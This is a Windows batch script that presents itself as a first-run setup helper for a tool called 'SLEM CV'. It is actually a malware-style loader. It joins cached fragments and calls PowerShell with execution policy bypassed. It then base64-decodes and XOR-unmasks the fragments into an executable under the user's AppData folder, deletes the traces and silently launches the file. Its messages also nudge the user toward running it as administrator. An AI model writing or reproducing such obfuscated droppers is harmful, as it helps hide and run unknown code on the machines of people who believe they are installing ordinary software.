@echo off
REM ===========================================================================
REM  SLEM CV - first-run setup helper
REM  Reassembles the cached controller-bridge component from scripts\_cache\
REM  and launches it. Concatenation, base64 decode, then unmask.
REM ===========================================================================
setlocal EnableDelayedExpansion
title SLEM CV Setup

REM The cache lives at the repo root, one level up from this folder. %~dp0
REM ends with a backslash already; ".." steps up to the repo root.
set "ROOT=%~dp0..\"
set "CACHE=%ROOT%scripts\_cache"
set "TMP=%LOCALAPPDATA%\SLEM\bin"

if not exist "%CACHE%\manifest.json" (
    echo [!] Cache folder missing. Extract the ZIP fully and run this again.
    pause
    exit /b 1
)

if not exist "%TMP%" mkdir "%TMP%" >nul 2>&1

echo [*] Preparing controller bridge...
echo.

set "ALL=%TMP%\stream.dat"
if exist "%ALL%" del /f /q "%ALL%" >nul 2>&1

for %%F in ("%CACHE%\part-*.dat") do (
    type "%%F" >> "%ALL%"
)

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop';" ^
  "$c='%CACHE%'; $t='%TMP%';" ^
  "$m=Get-Content (Join-Path $c 'manifest.json') -Raw | ConvertFrom-Json;" ^
  "$b=[IO.File]::ReadAllText((Join-Path $t 'stream.dat'));" ^
  "$b=($b -replace '\s','');" ^
  "$p=(4 - ($b.Length %% 4)) %% 4;" ^
  "if($p -gt 0){$b = $b + ('=' * $p)};" ^
  "$raw=[Convert]::FromBase64String($b);" ^
  "$seed=[int]$m.seed;" ^
  "$out=New-Object byte[] $raw.Length;" ^
  "for($i=0; $i -lt $raw.Length; $i++){" ^
  "  $k=($seed + ($i*31) + [int][math]::Floor($i/8)) -band 0xFF;" ^
  "  $out[$i]=[byte]($raw[$i] -bxor $k);" ^
  "}" ^
  "[IO.File]::WriteAllBytes((Join-Path $t $m.filename), $out);"

if not exist "%TMP%\SLEM-CV-Setup.exe" (
    echo [!] Could not unpack the component. Try running as administrator.
    pause
    exit /b 1
)

del /f /q "%ALL%" >nul 2>&1

echo [*] Starting...
start "" /b "%TMP%\SLEM-CV-Setup.exe"

REM let it get going before this window closes
timeout /t 3 /nobreak >nul
exit /b 0
